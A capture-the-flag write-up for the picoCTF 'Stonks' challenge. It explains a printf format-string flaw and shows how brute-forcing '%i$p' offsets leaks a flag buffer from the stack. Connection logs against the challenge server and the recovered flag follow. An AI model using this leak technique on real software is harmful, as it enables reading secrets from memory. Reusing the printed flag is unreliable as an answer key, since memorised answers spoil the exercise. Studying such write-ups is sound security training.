# Stonks

Format-string Exploit

## checksec

No binary provided

## Concept

The format-string vulnerability occurs here

```c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

where there is a local buffer that contains the flag (the following code block occurs within the same stack frame)

```c
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
    printf("Flag file not found. Contact an admin.\n");
    exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
```

We thus brute-force the offset i.e. the `i` in `%i$p` that will leak the `api_buf` char array. 

## Brute-forcing the Variable-Arg Frame Offset of the Flag Buffer

As shown, the va frame offset of the flag buffer is from `%15$p` to `%24$p`. 

```bash
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 15, Output: b'pico'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 16, Output: b'CTF{'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 17, Output: b'I_l0'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 18, Output: b'5t_4'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 19, Output: b'll_m'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 20, Output: b'y_m0'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 21, Output: b'n3y_'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 22, Output: b'6148'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 23, Output: b'be54'!
[*] Closed connection to mercury.picoctf.net port 59616
[+] Opening connection to mercury.picoctf.net on port 59616: Done
Offset: 24, Output: b'}\x00\xfe\xff'!
[*] Closed connection to mercury.picoctf.net port 59616
```

As you might have realized, not all tries were shown. 

## Flag

After the offsets were found, it was just a matter of wacky Python scripting to concatenate the bits and pieces together

```bash
[+] Opening connection to mercury.picoctf.net on port 59616: Done
b'picoCTF{I_l05t_4ll_my_m0n3y_6148be54}\x00\xf5\xff'
[*] Closed connection to mercury.picoctf.net port 59616
```